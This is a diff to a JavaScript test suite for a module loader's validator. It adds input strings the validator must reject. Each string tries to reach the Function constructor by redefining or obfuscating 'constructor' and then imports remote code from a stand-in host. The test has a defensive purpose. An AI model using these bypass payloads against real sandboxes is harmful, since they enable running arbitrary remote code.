@@ -1536,6 +1536,18 @@ describe("routing/api/module-loader/http-validator", () => {
         ` if (false) f = []; return make('return import("https://blocked.example/mod.js")')(); }; run();`,
         `const C = class K { static run() { const k = ["con", "structor"].join(""); const make = K[k];` +
         ` if (false) K = []; return make('return import("https://blocked.example/mod.js")')(); } }; C.run();`,
+        // Property-defining intrinsics can replace `constructor` like an assignment.
+        `const local = (s) => s; Object.defineProperty(Array.prototype, "constructor", { value: local });` +
+        ` [].constructor('return import("https://blocked.example/mod.js")')();`,
+        `const local = (s) => s; Reflect.defineProperty(String.prototype, "constructor", { value: local });` +
+        ` "x".constructor('return import("https://blocked.example/mod.js")')();`,
+        `const local = (s) => s; const h = {}; Object.defineProperties(h, { constructor: { value: local } });` +
+        ` h.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const local = (s) => s; Object.assign(Array.prototype, { constructor: local });` +
+        ` [].constructor('return import("https://blocked.example/mod.js")')();`,
+        `const local = (s) => s; const key = ["con", "structor"].join("");` +
+        ` Object.defineProperty(Array.prototype, key, { value: local });` +
+        ` [].constructor('return import("https://blocked.example/mod.js")')();`,
       ];
       for (const source of sources) {
         await assertRejects(
